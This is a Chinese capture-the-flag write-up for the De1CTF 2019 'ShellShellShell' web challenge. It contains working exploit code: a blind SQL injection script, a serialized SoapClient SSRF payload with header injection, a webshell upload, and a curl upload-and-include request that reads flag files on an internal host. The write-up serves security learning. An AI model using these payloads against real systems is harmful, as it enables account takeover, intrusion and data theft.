---
title: '[De1CTF 2019]ShellShellShell'
date: 2025-03-18 19:31:43
tags: 
categories: 刷题笔记
---

## [De1CTF 2019]ShellShellShell

我们将login换成register能进行注册账号

![image-20250318194937694](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181949918.png)

但注册账号我们需要验证码

```php
<?php
for ($i = 1; $i <10000000000 ; $i++) {
    if(substr(md5($i), 0, 5) === "28647"){
        echo $i;
        break;
}
}
```

我们尝试注册admin，发现注册失败，可能后面我们需要登录admin

我们在这先创建一个test账号

![image-20250318195137765](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181951823.png)

登录进来了，我们能在publish处上传emoji表情包

![image-20250318195501117](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181955144.png)

然后不知道咋做了，那我们就扫描目录

![image-20250318195552602](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181955673.png)

我们访问views能看到源码

![image-20250318195622733](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503181956800.png)

我们能在里面下载下源码

**index.php**

```php

<?php

require_once 'user.php';
$C = new Customer();
if(isset($_GET['action']))
{
    $action=$_GET['action'];
    $allow=0;
    $white_action = "delete|index|login|logout|phpinfo|profile|publish|register";
    $vpattern = explode("|",$white_action);
    foreach($vpattern as $key=>$value)
    {
        if(preg_match("/$value/i", $action ) &&  (!preg_match("/\//i",$action))   )
        {
            $allow=1;
        }
    }
    if($allow==1)
    {require_once 'views/'.$_GET['action'];}
    else {
        die("Get out hacker!<br>jaivy's laji waf.");
    }
}
else
header('Location: index.php?action=login');
```

**user.php**

```php

<?php

require_once 'config.php';

class Customer{
    public $username, $userid, $is_admin, $allow_diff_ip;

    public function __construct()
    {
        $this->username = isset($_SESSION['username'])?$_SESSION['username']:'';
        $this->userid = isset($_SESSION['userid'])?$_SESSION['userid']:-1;
        $this->is_admin = isset($_SESSION['is_admin'])?$_SESSION['is_admin']:0;
        $this->get_allow_diff_ip();
    }

    public function check_login()
    {
        return isset($_SESSION['userid']);
    }

    public function check_username($username)
    {
        if(preg_match('/[^a-zA-Z0-9_]/is',$username) or strlen($username)<3 or strlen($username)>20)
            return false;
        else
            return true;
    }

    private function is_exists($username)
    {
        $db = new Db();
        @$ret = $db->select('username','ctf_users',"username='$username'");
        if($ret->fetch_row())
            return true;
        else
            return false;
    }

    public function get_allow_diff_ip()
    {
        if(!$this->check_login()) return 0;
        $db = new Db();
        @$ret = $db->select('allow_diff_ip','ctf_users','id='.$this->userid);
        if($ret) {

            $user = $ret->fetch_row();
            if($user)
            {
                $this->allow_diff_ip = (int)$user[0];
                return 1;
            }
            else
                return 0;

        }
    }

    function login()
    {
        if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['code'])) {
            if(substr(md5($_POST['code']),0, 5)!==$_SESSION['code'])
            {
                die("code erroar");
            }
            $username = $_POST['username'];
            $password = md5($_POST['password']);
            if(!$this->check_username($username))
                die('Invalid user name');
            $db = new Db();
            @$ret = $db->select(array('id','username','ip','is_admin','allow_diff_ip'),'ctf_users',"username = '$username' and password = '$password' limit 1");

            if($ret)
            {

                $user = $ret->fetch_row();
                if($user) {
                    if ($user[4] == '0' && $user[2] !== get_ip())
                        die("You can only login at the usual address");
                    if ($user[3] == '1')
                        $_SESSION['is_admin'] = 1;
                    else
                        $_SESSION['is_admin'] = 0;
                    $_SESSION['userid'] = $user[0];
                    $_SESSION['username'] = $user[1];
                    $this->username = $user[1];
                    $this->userid = $user[0];
                    return true;
                }
                else
                    return false;

            }
            else
            {
                return false;
            }

        }
        else
            return false;

    }

    function register()
    {
        if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['code'])) {
            if(substr(md5($_POST['code']),0, 5)!==$_SESSION['code'])
            {
                die("code error");
            }
            $username = $_POST['username'];
            $password = md5($_POST['password']);

            if(!$this->check_username($username))
                die('Invalid user name');
            if(!$this->is_exists($username)) {

                $db = new Db();

                @$ret = $db->insert(array('username','password','ip','is_admin','allow_diff_ip'),'ctf_users',array($username,$password,get_ip(),'0','1')); //No one could be admin except me
                if($ret)
                    return true;
                else
                    return false;

            }

            else {
                die("The username is not unique");
            }
        }
        else
        {
            return false;
        }
    }

    function publish()
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {
            if(isset($_POST['signature']) && isset($_POST['mood'])) {

                $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
                $db = new Db();
                @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
                if($ret)
                    return true;
                else
                    return false;
            }
        }
        else
        {
                if(isset($_FILES['pic'])) 
                {
                    $dir='/app/upload/';
                    move_uploaded_file($_FILES['pic']['tmp_name'],$dir.$_FILES['pic']['name']);
                    echo "<script>alert('".$_FILES['pic']['name']."upload success');</script>";
                    return true;
                }
                else
                    return false;


        }

    }

    function showmess()
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {
            //id,sig,mood,ip,country,subtime
            $db = new Db();
            @$ret = $db->select(array('username','signature','mood','id'),'ctf_user_signature',"userid = $this->userid order by id desc");
            if($ret) {
                $data = array();
                while ($row = $ret->fetch_row()) {
                    $sig = $row[1];
                    $mood = unserialize($row[2]);
                    $country = $mood->getcountry();
                    $ip = $mood->ip;
                    $subtime = $mood->getsubtime();
                    $allmess = array('id'=>$row[3],'sig' => $sig, 'mood' => $mood, 'ip' => $ip, 'country' => $country, 'subtime' => $subtime);
                    array_push($data, $allmess);
                }
                $data = json_encode(array('code'=>0,'data'=>$data));
                return $data;
            }
            else
                return false;

        }
        else
        {
            $filenames = scandir('adminpic/');
            array_splice($filenames, 0, 2);
            return json_encode(array('code'=>1,'data'=>$filenames));

        }
    }

    function allow_diff_ip_option()
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {
            if(isset($_POST['adio'])){
                $db = new Db();
                @$ret = $db->update_single('ctf_users',"id = $this->userid",'allow_diff_ip',(int)$_POST['adio']);
                if($ret)
                    return true;
                else
                    return false;
            }
        }
        else
            echo 'admin can\'t change this option';
            return false;
    }

    function deletemess()
    {
        if(!$this->check_login()) return false;
        if(isset($_GET['delid'])) {
            $delid = (int)$_GET['delid'];
            $db = new Db;
            @$ret = $db->delete('ctf_user_signature', "userid = $this->userid and id = '$delid'");
            if($ret)
                return true;
            else
                return false;
        }
        else
            return false;
    }

}
```

**config.php**

```php
<?php
#test
header("Content-Type:text/html;charset=UTF-8");
date_default_timezone_set("PRC");

session_start();
class Db
{
    private  $servername = "localhost";
    private  $username = "Nu1L";
    private  $password = "***********";#you don't know!
    private  $dbname = "nu1lctf";
    private  $conn;

    function __construct()
    {
        $this->conn = new mysqli($this->servername, $this->username, $this->password, $this->dbname);
    }

    function __destruct()
    {
        $this->conn->close();
    }

    private function get_column($columns){

        if(is_array($columns))
            $column = ' `'.implode('`,`',$columns).'` ';
        else
            $column = ' `'.$columns.'` ';

        return $column;
    }

    public function select($columns,$table,$where) {

        $column = $this->get_column($columns);

        $sql = 'select '.$column.' from '.$table.' where '.$where.';';
        $result = $this->conn->query($sql);

        return $result;

    }

    public function insert($columns,$table,$values){

        $column = $this->get_column($columns);
        $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
        $nid =
        $sql = 'insert into '.$table.'('.$column.') values '.$value;
        $result = $this->conn->query($sql);

        return $result;
    }

    public function delete($table,$where){

        $sql =  'delete from '.$table.' where '.$where;
        $result = $this->conn->query($sql);

        return $result;
    }

    public function update_single($table,$where,$column,$value){

        $sql = 'update '.$table.' set `'.$column.'` = \''.$value.'\' where '.$where;
        $result = $this->conn->query($sql);

        return $result;
    }




}

class Mood{

    public $mood, $ip, $date;

    public function __construct($mood, $ip) {
        $this->mood = $mood;
        $this->ip  = $ip;
        $this->date = time();

    }

    public function getcountry()
    {
        // $ip = @file_get_contents("http://ip.taobao.com/service/getIpInfo.php?ip=".$this->ip);
        // $ip = json_decode($ip,true);
        return "glzjin";
    }

    public function getsubtime()
    {
        $now_date = time();
        $sub_date = (int)$now_date - (int)$this->date;
        $days = (int)($sub_date/86400);
        $hours = (int)($sub_date%86400/3600);
        $minutes = (int)($sub_date%86400%3600/60);
        $res = ($days>0)?"$days days $hours hours $minutes minutes ago":(($hours>0)?"$hours hours $minutes minutes ago":"$minutes minutes ago");
        return $res;
    }


}

function get_ip(){
    return $_SERVER['REMOTE_ADDR'];
}


function addslashes_deep($value)
{
    if (empty($value))
    {
        return $value;
    }
    else
    {
        return is_array($value) ? array_map('addslashes_deep', $value) : addslashes($value);
    }
}
function rand_s($length = 8)
{
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|';
    $password = '';
    for ( $i = 0; $i < $length; $i++ )
    {
        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
    }
    return $password;
}

function addsla_all()
{
    if (!get_magic_quotes_gpc())
    {
        if (!empty($_GET))
        {
            $_GET  = addslashes_deep($_GET);
        }
        if (!empty($_POST))
        {
            $_POST = addslashes_deep($_POST);
        }
        $_COOKIE   = addslashes_deep($_COOKIE);
        $_REQUEST  = addslashes_deep($_REQUEST);
    }
}
addsla_all();
```

**publish.php**

```php

<?php

if(!$C->check_login())
{
    header('Location: index.php?action=login');
    exit;
}
if($C->is_admin==0) {
    if (isset($_POST['signature']) && isset($_POST['mood'])) {
        $res = @$C->publish();
        if($res){
            echo "<script>alert('ok');self.location='index.php?action=index'; </script>";
            exit;
        }
        else {
            echo "<script>alert('something error');self.location='index.php?action=publish'; </script>";
            exit;
        }
    } else {

        ?>

        <!DOCTYPE html>
        <html>
        <head>
            <title>Profile</title>
            <link href="static/bootstrap.min.css" rel="stylesheet">
            <script src="static/jquery.min.js"></script>
            <script src="static/bootstrap.min.js"></script>
        </head>
        <body>
        <a href="index.php?action=logout">logout</a>
        <center>
            <div class="container" style="margin-top:100px">
                <h3>Hi <a href="index.php?action=profile"><?php echo $C->username; ?></a></h3><br>
                <form method='post' action="index.php?action=publish">
                    <p>Please input your signature: <br><textarea name="signature"></textarea></p>
                    <p>Please choose your mood: <br>
                        <input type="radio" name="mood" value="0" checked="checked" /><img src="img/0.gif">
                        <input type="radio" name="mood" value="1" /><img src="img/1.gif">
                        <input type="radio" name="mood" value="2" /><img src="img/2.gif"></p>
                    <input type="submit" value="Submit"/>

                </form>
            </div>
             <a href="index.php?action=index"><img src='img/home.png'></a>
        </center>
        </body>
        </html>
    <?php }

}
else{
echo "Hello ".$C->username."<br>";
echo "Orz...大佬果然进来了!<br>但jaivy说flag不在这,要flag,来内网拿...<br>";
    if(isset($_FILES['pic'])){
        $res = @$C->publish();
        if($res){
            echo "<script>alert('ok');self.location='index.php?action=publish'; </script>";
            exit;
        }
        else {
            echo "<script>alert('something error');self.location='index.php?action=publish'; </script>";
        }
    }

?>

                <form method='post' action="index.php?action=publish" enctype="multipart/form-data">
                    <p>Please upload a pictrue: <br><input name='pic' type='file'></p>
                    <input type="submit" value="Submit"/>

                </form>


<?php
}

?>
```

在user.php中，在publish页面传入的signature参数没有做校验，导致signature可控

![image-20250318201640284](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182016489.png)

查看config.php中的insert函数，首先调用get_column()将$values数组用','拼接，在通过preg_replace()将两个匹配的'（中间不包含，）替换为'

![image-20250318203023350](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182030430.png)                                            

![image-20250318203031025](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182030081.png)

我们可以构造1`使得

```
`id`,`name`,`1``,`mood`   ==>  'id','name','1'`,'mood'
```

提交

```
1`
```

![image-20250318203358157](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182033200.png)

我们提交

```
1`,1)#
```

提示ok，说明sql注入存在

![image-20250318203448106](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182034153.png)

我们从user.php中的register函数获得表名和列名

```php
@$ret = $db->insert(array('username','password','ip','is_admin','allow_diff_ip'),'ctf_users',array($username,$password,get_ip(),'0','1')); //No one could be admin except me
```

python脚本获取admin密码

```py

import requests

url="http://ce283c4e-25f1-47a3-b00f-465788a3662a.node4.buuoj.cn:81/index.php?action=publish"
cookie = {"PHPSESSID":"t5rculf6qdcd7ksgif8s8e4sj1"}

k="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
flag=""

for i in range(50): 
    for j in k:
        j = ord(j)
        data={
            'mood':'0',
            'signature':'1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)
            }
        try:
            r=requests.post(url,data=data,cookies=cookie,timeout=(2,2))
        except:
            flag+=chr(j)
            print(flag)
            break
```

跑出来密码的md5为：c991707fdf339958eded91331fb11ba0

网站解密为jaivypassword

我们知道了admin和password，我们登录看看

登录admin后，提示需要本地登录

![image-20250318204933844](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182049898.png)

访问/index.php?action=phpinfo，发现开启soap扩展。SoapClient类内置__call()，触发后可以发送HTTP和HTTPS请求，可用于SSRF。

[soap反序列化利用](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0)

![img](https://img2022.cnblogs.com/blog/2158663/202203/2158663-20220301233223206-933692787.jpg)

在user。php的showmess()使用了unserialize，反序列化的内容为ctf_user_signature中的mood列的数据，由于前面功能存在sql注入，导致mood可控

![image-20250318210255538](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182102610.png)

使用另一个浏览器开启一个新的窗口，将新的窗口的cookie及code填入对应位置

```php

<?php
$target = 'http://127.0.0.1/index.php?action=login';
$post_string = 'username=admin&password=jaivypassword&code=1194911';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=124l5i5jsqsa7vuetnmikdtsp2'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
echo bin2hex($aaa);
?>
```

使用原来的test用户发布签名

![image-20250318211543824](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182115938.png)

然后刷新刚刚使用那应该浏览器开启的新的窗口，admin登录成功

![image-20250318211616106](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182116151.png)

点击publish，发现文件上传，提示flag在内网

![image-20250318211641510](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182116550.png)

上传图片马，bp修改后缀为php，访问/upload/

![image-20250318212823689](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182128746.png)

使用蚁剑连接，我们执行ifconfig

![image-20250318212853694](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182128791.png)

使用设置蚁剑代理为burp的代理，使用端口扫描插件，扫描10.224.80.227，将抓取到的报文发至intruder，探测C段主机

![image-20250318213346255](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182133390.png)

发现10.244.80.255开启80端口

![image-20250318213410973](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182134068.png)

执行蚁剑终端执行`curl http://10.244.80.225/`

![image-20250318213451918](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182134041.png)

再执行`curl http://10.244.80.225/ > 1.html`，并访问，为php源码

```php

<?php
$sandbox = '/var/sandbox/' . md5("prefix" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);

if($_FILES['file']['name']){
    $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
    if (!is_array($filename)) {
        $filename = explode('.', $filename);
    }
    $ext = end($filename);
    if($ext==$filename[count($filename) - 1]){
        die("try again!!!");
    }
    $new_name = (string)rand(100,999).".".$ext;
    move_uploaded_file($_FILES['file']['tmp_name'],$new_name);
    $_ = $_POST['hello'];
    if(@substr(file($_)[0],0,6)==='@<?php'){
        if(strpos($_,$new_name)===false) {
            include($_);
        } else {
            echo "you can do it!";
        }
    }
    unlink($new_name);
}
else{
    highlight_file(__FILE__);
}
```

首先判断`$ext==$filename[count($filename) - 1]`

如果传入file=a.php，$filename将变为

```php

array(2) {
  [0]=>
  string(1) "a"
  [1]=>
  string(3) "php"
}
```

```
$ext=php，$filename[count($filename) - 1]=$filename[1]=php
```

如果post传入数组，先传入file[1]=a，再传入file[0]=php，$filename将变为

```php

array(2) {
  [1]=>
  string(1) "a"
  [0]=>
  string(3) "php"
}
```

end($fileename)即\$ext仍为php，但是\$filename[1]=a,即可绕过\$ext==\$filename[count(\$filename)-1]判断（本质因为是键值对数组）

然后是文件上传改名，可以通过目录穿越绕过，当$ext=/../a.php时（即\$file[0]=/../a.php）,\$new_name=123./../a.php,即上传文件到当前目录，文件名为a.php

```php
$new_name = (string)rand(100,999).".".$ext;
move_uploaded_file($_FILES['file']['tmp_name'],$new_name
```

最后是对要包含的文件的文件内容和文件名进行校验，标签前加@并不影响执行（无视），因为上一步绕过文件上传，将a.php上传到当前目录，所以传入hello=a.php，并不等于$new_name。

```php
$_ = $_POST['hello'];
    if(@substr(file($_)[0],0,6)==='@<?php'){
        if(strpos($_,$new_name)===false) {
            include($_);
        } else {
            echo "you can do it!";
        }
    }
```

在之前admin的文件上传页面上传a.php，内容为

```php
@<?php echo `find /etc -name *flag* -exec cat {} +`;
```

利用Postman生成curl命令，实际使用时删除postman生成的file参数中a.php的前缀

![image-20250318214849558](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182148674.png)

在蚁剑终端执行curl命令发送post请求

```bash
curl --location --request POST 'http://10.244.80.225' --form 'file=@"a.php"' --form 'hello="a.php"' --form 'file[1]="111"' --form 'file[2]="222"' --form 'file[0]="/../a.php"'
```

![image-20250318214915735](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503182149871.png)

参考

https://www.cnblogs.com/CabbageJun/p/15953184.html

https://blog.csdn.net/qq_43756333/article/details/107386403
